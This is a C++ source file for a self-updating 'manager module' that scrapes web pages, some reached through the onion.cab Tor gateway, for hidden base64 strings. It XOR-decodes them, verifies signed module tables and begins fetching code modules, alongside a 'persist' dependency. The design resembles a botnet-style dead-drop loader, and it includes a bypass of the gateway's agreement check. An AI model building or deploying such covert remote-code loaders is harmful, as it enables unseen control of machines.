//xxx: Later maybe this can be automated?
#define MODULE_ID 3133916783
#include <modules/manager/Manager.h>
#include <boost/thread.hpp>
#include <boost/regex.hpp>
#include <stdexcept>
#include <algorithm>
#include <openssl/md5.h>
#include <charlie/base64.h>
#include <vector>
#include <charlie/xor.h>
#include <charlie/CryptoBuf.h>

#undef VERBOSE
//#define VERBOSE 1

using namespace modules::manager;
using namespace boost::network;

ManagerModule::ManagerModule()
{
  http::client::options options;
  options.follow_redirects(true);
  client = boost::network::http::client(options);
  MLOG("Manager module constructed...");
  pInter = new ManagerInter(this);
}

void ManagerModule::shutdown()
{
  MLOG("Shutting down manager module..");
  delete pInter;
}

void ManagerModule::setModuleInterface(ModuleInterface* inter)
{
  MLOG("Received module interface");
  mInter = inter;
}

void ManagerModule::injectDependency(u32 id, void* dep)
{
  MLOG("Dep injected "<<id);
}

void ManagerModule::releaseDependency(u32 id)
{
  MLOG("Dep released "<<id);
}

std::string ManagerModule::fetchOnionCabUrl(const std::string& url)
{
  bool hasRehashed = false;

  /*
   * Send the request, if we get a tttt= rehash
   * If we have already rehashed and get ttt= again exit
   */
  while(true)
  {
    http::client::request request(url);
    if(onionCabHash.empty() && stor.has_onion_cab_cookie())
    {
      onionCabHash = std::string(stor.onion_cab_cookie());
      MLOG("Loaded onion.cab cookie from storage: "<<onionCabHash);
    }
    std::string cookie;
    if(!onionCabHash.empty())
    {
      cookie = std::string("onion_cab_iKnowShit=")+onionCabHash+";";
#ifdef VERBOSE
      MLOG("Using header: Cookie: "<<cookie);
#endif
      request << header("Cookie", cookie.c_str());
    }
    request << header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
    request << header("Accept-Encoding", "identity");
    request << header("Accept-Language", "en-US,en;q=0.8,ru;q=0.6");
    request << header("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36");
    request << header("Connection", "close");
    http::client::response response = client.get(request);
    const std::string s = body(response);

    if(s.find("loadAgreement()")!=std::string::npos)
    {
      if(hasRehashed)
      {
        MERR("Onion cab still not accepting our verification hash.");
        throw std::runtime_error("onion_cab");
      }
      hasRehashed = true;
      boost::match_results<std::string::const_iterator> results;

      //Find the  value
      boost::regex t5r("(var ttttt=)('.*?')");
      boost::regex tk3r("(\"tktktk\\|atob\\|)([a-zA-Z0-9]*)(\".split\\(\"\\|\"\\))");
      if (boost::regex_search(s.begin(), s.end(), results, t5r))
      {
        std::string t5(results[2]);
        t5 = t5.substr(1, t5.length()-2);
#ifdef VERBOSE
        MLOG("t5 value: "<<t5);
#endif
        //Fetch tk3 value
        request = http::client::request("https://onion.cab/js/jQuery.js");
        request << header("Connection", "close");
        response = client.get(request);
        const std::string jqs = body(response);

        //Find tk3
        if (boost::regex_search(jqs.begin(), jqs.end(), results, tk3r))
        {
          std::string tk3(results[2]);
          //base 64 decode
          {
            unsigned char* b64d;
            size_t b64dl = (size_t)base64Decode(tk3.c_str(), tk3.length(), &b64d);
            tk3 = std::string((const char*)b64d, b64dl);
            free(b64d);
          }

#ifdef VERBOSE
          MLOG("tk3 value: "<<tk3);
#endif
          //Now we have to md5...
          char mdString[33];
          {
            std::string tksum = tk3+t5;
            unsigned char digest[MD5_DIGEST_LENGTH];
            MD5((const unsigned char*)tksum.c_str(), tksum.length(), (unsigned char*)&digest);
            for (int i = 0; i < 16; i++)
              sprintf(&mdString[i*2], "%02x", (unsigned int)digest[i]);
          }
#ifdef VERBOSE
          MLOG("Final onionCab iKnowShit is "<<mdString);
#endif
          onionCabHash = std::string(mdString, 33);
          stor.set_onion_cab_cookie(onionCabHash);
          saveStorage();
          continue;
        }else
        {
          MERR("Onion cab: unable to find tk3 in jQuery");
          throw std::runtime_error("no_tk3");
        }
      }
      else{
#ifdef VERBOSE
        MERR("Onion cab: unable to find t5 in agreement script!");
#endif
        throw std::runtime_error("no_t5");
      }
    }
    return s;
  }
}

//Might throw exceptions!
std::string ManagerModule::fetchStaticUrl(const std::string& iurl)
{
  std::string url(iurl);
  int attempts = 0;
  std::string s;
  while(attempts < 10){
    bool redir = false;
    http::client::request request(url);
    request << header("Connection", "close");
    http::client::response response =
      client.get(request);
    headers_range<http::client::response>::type headers_ = response.headers();
    typedef std::pair<std::string, std::string> header_type;
    BOOST_FOREACH(header_type const & header, headers_) {
#ifdef VERBOSE
      MLOG(header.first << ": " << header.second);
#endif
      if(header.first.compare("Location") == 0)
      {
#ifdef VERBOSE
        MLOG("Location header, following -> "<<header.second);
#endif
        redir = true;
        url = header.second;
      }
    }
    s = body(response);
    if(!redir)
      return s;
  }
  MERR("Went past 10 redirects, stopping here...");
  return s;
}

std::string ManagerModule::fetchUrl(const std::string& url)
{
  if(url.find("onion.cab") != std::string::npos)
    return fetchOnionCabUrl(url);
  return fetchStaticUrl(url);
}

void ManagerModule::saveStorage()
{
  std::string data;
  if(!stor.SerializeToString(&data))
  {
    MERR("Unable to serialize storage to string!");
    return;
  }
  mInter->saveStorage(data);
}

//Base64
//^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$

charlie::CModuleTable* ManagerModule::fetchStaticModTable(charlie::CSignedBuffer** lmb)
{
  MLOG("Fetching initial module tables from all sources...");
  boost::regex re("@[a-zA-Z0-9+/]+={0,2}");
  boost::match_results<std::string::const_iterator> results;
  charlie::CModuleTable* latest = 0;
  for(auto str : sInfo.init_url())
  {
    try {
      MLOG("Trying to fetch table from "<<str<<"...");
      const std::string s = fetchUrl(str);
#if VERBOSE
      MLOG("Body: "<<s);
#endif

      boost::sregex_token_iterator iter(s.begin(), s.end(), re, 0);
      boost::sregex_token_iterator end;
      bool foundOne = false;
      for(; iter != end; ++iter)
      {
        foundOne = true;
        std::string b64 = std::string(*iter).substr(1);
#if VERBOSE
        MLOG("Found an encoded module table: "<<b64);
#endif
        //Decode base64
        unsigned char* b64d;
        int b64len;
        try {
          b64len = base64Decode(b64.c_str(), b64.length(), &b64d);
          apply_xor(b64d, b64len, ONLINE_MTABLE_KEY, strlen(ONLINE_MTABLE_KEY));
        }catch(...)
        {
          MERR("Error occurred decoding base 64.");
        }
#ifndef NDEBUG
#if VERBOSE
        {
          char mdString[33];
          unsigned char digest[MD5_DIGEST_LENGTH];
          MD5((const unsigned char*)b64d, b64len, (unsigned char*)&digest);
          for (int i = 0; i < 16; i++)
            sprintf(&mdString[i*2], "%02x", (unsigned int)digest[i]);
          MLOG("MD5 of data: "<<mdString);
          MLOG("Length of data: "<<b64len);
        }
#endif
#endif
        //Decrypt CSignedBuffer
        charlie::CSignedBuffer buf;
        if(buf.ParseFromArray(b64d, b64len))
        {
          //Verify signature
          if(verifySignedBuf(&buf, crypt) == 0)
          {
            charlie::CWebInformation winfo;
            if(winfo.ParseFromArray(buf.data().c_str(), buf.data().length()))
            {
              MLOG("Web information timestamp "<<winfo.timestamp()<<" verified.");

              //Verify second layer, another csignedbuffer
              if(winfo.has_mod_table()){
                charlie::CSignedBuffer mbuf = winfo.mod_table();
                charlie::CModuleTable mod_table;
                if(verifySignedBuf(&mbuf, crypt) == 0 && mod_table.ParseFromString(winfo.mod_table().data()))
                {
                  auto time = mod_table.timestamp();
                  MLOG("Discovered mtable with timestamp: "<<time);
                  if(latest==0 || latest->timestamp() < time)
                  {
                    charlie::CModuleTable* table = new charlie::CModuleTable();
                    table->CheckTypeAndMergeFrom(mod_table);
                    //MLOG("Latest discovered timestamp is now: "<<time);
                    delete latest;
                    latest = table;
                    if(lmb)
                    {
                      if(*lmb) delete *lmb;
                      *lmb = new charlie::CSignedBuffer();
                      (*lmb)->CheckTypeAndMergeFrom(mbuf);
                    }
                  }
                }else
                {
                  MERR("Module table failed to verify or parse.");
                }
              }
            }else
            {
              MERR("Unable to parse CWebInformation...");
            }
          }else
          {
            MERR("Parsed a valid signed buffer, but signature is invalid.");
          }
        }else
        {
          MERR("Data does not parse to a signed buffer.");
        }
      }
      if(!foundOne)
      {
        MLOG("No module tables found at link.");
      }
    }catch(...)
    {
      MERR("Error occured while fetching from "<<str);
    }
  }

  //Delete tables
  if(latest == 0)
  {
    MERR("Couldn't find any signed module tables online.");
    return 0;
  }

  MLOG("Latest static online module table is "<<latest->timestamp());
  return latest;
}

int ManagerModule::parseModuleInfo()
{
  std::string info = mInter->getModuleInfo();
  return sInfo.ParseFromString(info) == 0;
}

void ManagerModule::loadStorage()
{
  std::string* data = mInter->getStorage();
  if(data != NULL) stor.ParseFromString(*data);
}

int ManagerModule::updateTableFromInternet(charlie::CModuleTable **wtbl)
{
  charlie::CSignedBuffer* webtblb = 0;
  charlie::CModuleTable* webtbl = fetchStaticModTable(&webtblb);
  if(webtbl != 0)
  {
    int status = 0;
    MLOG("Web module table fetched.");
    //Parse existing table
    charlie::CSignedBuffer* etab = mInter->getModuleTable();
    charlie::CModuleTable emtab;
    bool repExist = false;
    if(!emtab.ParseFromString(etab->data()))
    {
      MERR("Unable to parse existing module table, assuming it's old...");
      repExist = true;
    }
    else
      repExist = emtab.timestamp() < webtbl->timestamp();
    if(repExist)
    {
      MLOG("Attempting to replace existing module table...");
      if(mInter->processModuleTable(webtblb))
      {
        MLOG("New module table successfully loaded and saved.");
        if(wtbl != 0) *wtbl = webtbl;
      }else
      {
        MERR("The new module table couldn't be loaded.");
        status = -1;
      }
    }else
    {
      MLOG("Table is older than current table. Ignoring.");
      status = 1;
    }
    if(wtbl == 0)
      delete webtbl;
    return status;
  }
  return -1;
}

int ManagerModule::downloadModules(charlie::CModuleTable* table)
{
  //We need to parse it ourselves
  bool delTab = false;
  if(table == 0)
  {
    charlie::CSignedBuffer* etab = mInter->getModuleTable();
    charlie::CModuleTable* emtab = new charlie::CModuleTable();
    if(!emtab->ParseFromString(etab->data()))
    {
      MERR("Unable to parse the existing module table in downloadModules.");
      return -1;
    }
    table = emtab;
    delTab = true;
  }

  // Now print out the acquire methods
  {
    int mcount = table->modules_size();
    for(int i=0;i<mcount;i++)
    {
      const charlie::CModule mod = table->modules(i);

      // Check if the module needs updating
      if(mInter->moduleLoadable(mod.id()))
        continue;

      int acqs = mod.acquire_size();
      MLOG("Module "<<mod.id()<<" has "<<acqs<<" acquire methods...");
      for(int ia=0;ia<acqs;ia++)
      {
        const charlie::CModuleAcquire acq = mod.acquire(ia);
        switch(acq.type())
        {
          case charlie::HTTP_GET:
            charlie::CHttpGetInfo nfo;
            if(nfo.ParseFromString(acq.data()))
            {
              MLOG("Fetching via HTTP: "<<nfo.url());
            }else
            {
              MERR("Unable to parse http get info.");
            }
            break;
        }
      }
    }
  }

  // Cleanup
  if(delTab) delete table;
}

bool running = true;
void ManagerModule::module_main()
{
  //Require persist module
  crypt = mInter->getCrypto();
  mInter->requireDependency(2526948902);
  mInter->commitDepsChanges();
  loadStorage();
  //mInter->relocateEverything("/tmp/testdir/");
  if(parseModuleInfo() != 0)
  {
    MERR("Unable to load module info...");
  }
  {
    charlie::CModuleTable* tbl;
    if(updateTableFromInternet(&tbl) != 0)
    {
      MERR("Unable to fetch (a newer?) static module table from the internet, downloading modules anyway...");
    }
    downloadModules();
  }
  while(running)
  {
    try{
      //An interruption point
      boost::this_thread::sleep(boost::posix_time::milliseconds(2000));
    }
    catch(...)
    {
      MLOG("Interrupted, exiting...");
      break;
    }
  }
}

void* ManagerModule::getPublicInterface()
{
  return (void*)pInter;
}

ManagerInter::ManagerInter(ManagerModule* mod)
{
  this->mod = mod;
}

CHARLIE_CONSTRUCT(ManagerModule);
